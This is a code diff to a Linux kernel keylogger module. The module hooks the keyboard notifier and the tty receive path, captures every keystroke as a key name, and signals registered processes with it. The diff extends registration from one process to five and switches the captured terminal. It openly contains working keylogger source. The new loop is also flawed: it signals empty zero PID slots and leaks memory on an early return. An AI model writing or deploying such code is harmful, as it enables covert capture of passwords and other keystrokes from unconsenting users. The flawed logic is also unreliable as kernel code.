@@ -25,12 +25,14 @@
 #define KEYLOG_NAME  "keylog"
 
 #define KEYLOG_BUF_SIZE 32
+#define MAX_REGISTERED_PROCS 5
 
 MODULE_LICENSE( "Dual BSD/GPL" );
 
 static char *key_buffer = NULL, *pid_buffer = NULL;
 static int  cur_buf_length = 0;
-static pid_t  registered_pid = -1; // Only allow one pid to register at a time
+static pid_t registered_pids[MAX_REGISTERED_PROCS];
+static int registered_proc_count = 0;
 
 static void (*old_receive_buf) (struct tty_struct *tty, const unsigned char *cp,
                         char *fp, int count);
@@ -73,10 +75,15 @@ ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_p
 
     print812( "Registering process %s", pid_buffer );
     
-    registered_pid = simple_strtol( pid_buffer, &endptr, 10 );
-    if ( registered_pid == 0 && endptr == pid_buffer ) {
-       print812( "Failed to parse pid" );
-       registered_pid = -1;
+    if(registered_proc_count < MAX_REGISTERED_PROCS) {
+        pid_t registered_pid = simple_strtol( pid_buffer, &endptr, 10 );
+        if ( registered_pid == 0 && endptr == pid_buffer ) {
+            print812( "Failed to parse pid" );
+        }
+        else {
+            registered_pids[registered_proc_count] = registered_pid;
+            registered_proc_count++;
+        }
     }
 
     return count;
@@ -119,7 +126,6 @@ struct file* file_open(const char* path, int flags, int rights) {
 void SendKey()
 {
     struct siginfo     *sinfo;    /* signal information */
-    struct task_struct *task;
 
     sinfo = kzalloc( sizeof(struct siginfo), GFP_KERNEL );
     if ( sinfo == NULL ) {
@@ -128,14 +134,18 @@ void SendKey()
     }
     sinfo->si_signo = SIGIO;
     sinfo->si_code = SI_USER;
-   
-    task = pid_task( find_vpid( registered_pid ), PIDTYPE_PID ); 
-    if ( task == NULL ) {
-        print812( "Failed to find task with pid %d", registered_pid );
-        return;
+  
+    int i=0;
+    for(i=0; i<MAX_REGISTERED_PROCS; i++) { 
+        struct task_struct *task;
+        task =  pid_task( find_vpid( registered_pids[i] ), PIDTYPE_PID ); 
+        if ( task == NULL ) {
+            print812( "Failed to find task with pid %d", registered_pids[i] );
+            return;
+        }
+
+        send_sig_info( SIGIO, sinfo, task );
     }
-    
-    send_sig_info( SIGIO, sinfo, task );
 
     if ( sinfo != NULL ) {
         kfree( sinfo );
@@ -144,22 +154,21 @@ void SendKey()
 
 void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
 {   
-    const char *key_name = NULL; 
-    int startBuffering = registered_pid >= 0; // Don't buffer unless someone is listening
+	const char *key_name = NULL; 
 
-    if(startBuffering && (count > 0))
+    if(registered_proc_count && (count > 0))
     {
         if (!tty->real_raw && !tty->raw)
         {
-            char dstStr[count + 1];
-            strncpy(dstStr, cp, count);
-            dstStr[count] = '\0';
+            //char dstStr[count + 1];
+            //strncpy(dstStr, cp, count);
+            //dstStr[count] = '\0';
             
-            key_name = get_tty_key_str(dstStr, count);
+            //key_name = get_tty_key_str(dstStr, count);
 
-            cur_buf_length = sprintf( key_buffer, "%s", key_name );
+            //cur_buf_length = sprintf( key_buffer, "%s", key_name );
             
-            SendKey();
+            //SendKey();
         }
     }
 
@@ -170,12 +179,10 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
 int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
     char *key_name = NULL; 
-    int startBuffering = registered_pid >= 0; // Don't buffer unless someone is listening
 
-    cur_buf_length = sprintf( key_buffer, "%s", key_name );
-
-    if ( code == KBD_KEYCODE && param->down && startBuffering ) {
+    if ( code == KBD_KEYCODE && param->down && registered_proc_count ) {
         key_name = GET_KEYNAME( param->value );
+        cur_buf_length = sprintf( key_buffer, "%s", key_name );
         SendKey();
 
         // print812( "Keycode %i %s\n", param->value, (param->down ? "down" : "up") );
@@ -224,7 +231,7 @@ static int hello_init( void ) {
 
     register_keyboard_notifier(&keyboardNotifierBlock);
     
-    file = file_open("/dev/tty1", O_RDONLY, 0);
+    file = file_open("/dev/tty0", O_RDONLY, 0);
     if(file != NULL)
     {
         tty = file->private_data;
